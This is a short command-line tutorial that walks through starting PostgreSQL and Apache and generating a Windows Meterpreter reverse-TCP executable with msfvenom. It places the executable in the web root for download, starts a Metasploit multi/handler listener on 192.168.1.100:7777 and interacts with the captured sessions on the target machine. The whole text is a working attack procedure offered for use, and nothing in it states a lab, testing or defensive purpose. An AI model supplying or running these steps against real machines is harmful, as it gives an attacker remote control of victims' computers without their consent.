# 1 - Start postgresql server

```
service postgresql start
```

# 2 - Start apache2 server

```
service apache2 start
```

# 3 - Choose and Create msfvenom Payload

```
msfvenom -h
```

```
ifconfig
```

choose one wlan0, eth inet is IP Address

```
msfvenom -p windows/meterpreter/reverse_tcp LPORT=7777 LHOST=192.168.1.100 -f exe -R > /var/www/html/winpayload.exe
```

(or)

```
msfvenom -p windows/meterpreter/reverse_tcp LPORT=7777 LHOST=192.168.1.100 -f exe -o ~/winpayload.exe
```

(or)

```
sudo msfvenom -p windows/meterpreter/reverse_tcp LPORT=7777 LHOST=192.168.1.100 -f exe -o /var/www/html/winpayload.exe
```

(or)

```
cd Desktop
```

```
msfvenom -p windows/meterpreter/reverse_tcp LPORT=7777 LHOST=192.168.1.100 -f exe -o winpayload.exe
```

# 4 - Attack the Target

```
msfconsole
```

```
use exploit/multi/handler
```

```
set payload windows/meterpreter/reverse_tcp
```

```
show options
```

```
set LPORT 7777
```

```
set LHOST 192.168.1.100
```

```
exploit
```

```
help
```

# 5 - Get List of Session

```
sessions
```

Interact with the session by using the `sessions -i <session number>` command. This will allow you to execute commands and interact with the target machine.

```
sessions -i <session number>
```